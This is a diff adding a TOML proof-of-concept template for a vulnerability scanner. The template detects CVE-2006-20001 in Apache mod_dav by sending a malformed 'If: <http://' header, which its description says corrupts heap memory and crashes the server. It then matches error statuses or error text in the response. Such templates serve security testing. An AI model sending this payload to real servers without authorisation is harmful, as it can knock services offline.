@@ -1,0 +1,46 @@
+[info]
+author = "AVE"
+description = "检测 Apache HTTP Server mod_dav 模块 If: 请求头越界读取/写入漏洞。通过发送特制的 If: 请求头触发堆内存越界操作，导致进程崩溃拒绝服务。"
+id = "POC-AVE-2006-0010"
+name = "Apache HTTP Server mod_dav If: Header Memory Corruption PoC"
+severity = "high"
+tags = [
+    "cve-2006-20001",
+    "apache",
+    "httpd",
+    "mod_dav",
+    "dos",
+]
+vuln_id = [
+    "CVE-2006-20001",
+    "AVE-2006-0010",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.headers]
+If = "<http://"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Internal Server Error",
+    "Service Unavailable",
+]
